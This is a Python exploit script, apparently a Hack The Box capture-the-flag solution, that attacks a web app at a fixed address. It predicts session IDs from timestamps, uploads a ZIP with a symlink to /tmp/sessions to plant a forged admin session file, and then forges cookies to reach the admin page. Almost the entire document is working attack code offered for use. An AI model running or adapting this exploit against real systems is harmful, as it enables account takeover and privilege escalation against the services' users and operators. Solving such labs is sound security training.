#!/usr/bin/env python3
import requests
import zipfile
import json
import time
import random
import string
import hashlib
import sys

# Configuration
TARGET_URL = "http://94.237.50.128:53928"

def get_session_id(timestamp):
    return hashlib.sha256(str(timestamp).encode()).hexdigest()

def exploit():
    # 1. Setup Users
    USER_A = "".join(random.choices(string.ascii_lowercase, k=8)) # Victim
    USER_B = "".join(random.choices(string.ascii_lowercase, k=8)) # Attacker
    PASSWORD = "password123"
    WRONG_PASSWORD = "wrongpassword"
    
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] User A (Victim): {USER_A}")
    print(f"[*] User B (Attacker): {USER_B}")
    
    s_b = requests.Session() # Session for User B
    s_final = requests.Session() # Session for final access
    
    # Register both
    requests.post(f"{TARGET_URL}/register", json={"username": USER_A, "password": PASSWORD})
    s_b.post(f"{TARGET_URL}/register", json={"username": USER_B, "password": PASSWORD})
    
    # Login User B to get upload access
    print(f"[*] Logging in User B...")
    s_b.post(f"{TARGET_URL}/login", json={"username": USER_B, "password": PASSWORD})
    if "session" not in s_b.cookies:
        print("[!] User B login failed")
        return False
        
    # 2. Prepare Attack
    # We need to predict the timestamp for User A's login attempt
    # Let's aim for T + 5 seconds
    target_time = int(time.time()) + 5
    predicted_session_id = get_session_id(target_time)
    print(f"[*] Target Time: {target_time}")
    print(f"[*] Predicted Session ID: {predicted_session_id}")
    
    # 3. Create and Upload Malicious Zip (as User B)
    print(f"[*] Creating malicious ZIP...")
    payload_data = {"username": USER_A, "id": 1337, "role": "admin"}
    payload_json = json.dumps(payload_data)
    
    with zipfile.ZipFile("exploit.zip", "w") as zf:
        # Symlink to /tmp/sessions
        symlink_info = zipfile.ZipInfo("sessions")
        symlink_info.create_system = 3
        symlink_info.external_attr = 0xA1ED0000
        zf.writestr(symlink_info, "/tmp/sessions")
        
        # Write User A's session file
        # sessions/USER_A/PREDICTED_ID
        # Note: We assume /tmp/sessions/USER_A does not exist. 
        # archiver should create the directory USER_A inside /tmp/sessions
        zf.writestr(f"sessions/{USER_A}/{predicted_session_id}", payload_json)
        
    with open("exploit.zip", "rb") as f:
        files = {"archive": ("exploit.zip", f, "application/zip")}
        print(f"[*] Uploading ZIP as User B...")
        r = s_b.post(f"{TARGET_URL}/user/upload", files=files)
        
    if r.status_code != 202:
        print(f"[!] Upload failed: {r.status_code}")
        print(f"[!] Response: {r.text[:200]}")
        return False
    else:
        print(f"[+] Upload accepted")
        
    # 4. Wait for Target Time and Trigger Failed Login (as User A)
    print(f"[*] Waiting for target time...")
    while int(time.time()) < target_time:
        time.sleep(0.1)
        
    print(f"[*] Triggering failed login for User A...")
    # We need to hit the exact second. 
    # To be safe, we can send multiple requests around the second?
    # But only one will match the file we wrote.
    # Let's try to be precise.
    
    # Actually, if we miss the second, the Redis key will point to a WRONG session ID.
    # And our file will be ignored.
    # So we must hit it.
    
    # Let's just send one request and hope timing is right.
    # Or we could have written MULTIPLE files for T, T+1, T+2...
    # But let's stick to one for now.
    
    requests.post(f"{TARGET_URL}/login", json={"username": USER_A, "password": WRONG_PASSWORD})
    
    # 5. Access Admin (as User A)
    print(f"[*] Attempting admin access as User A...")
    s_final.cookies.set("username", USER_A)
    s_final.cookies.set("session", predicted_session_id)
    
    r = s_final.get(f"{TARGET_URL}/user/admin")
    print(f"[*] Status: {r.status_code}")
    
    if "HTB{" in r.text:
        print("\n" + "="*60)
        print(f"[+] FLAG FOUND!")
        import re
        match = re.search(r"HTB\{[^}]+\}", r.text)
        if match:
            print(f"[+] {match.group(0)}")
        print("="*60)
        return True
    else:
        print("[-] Failed")
        return False

if __name__ == "__main__":
    exploit()
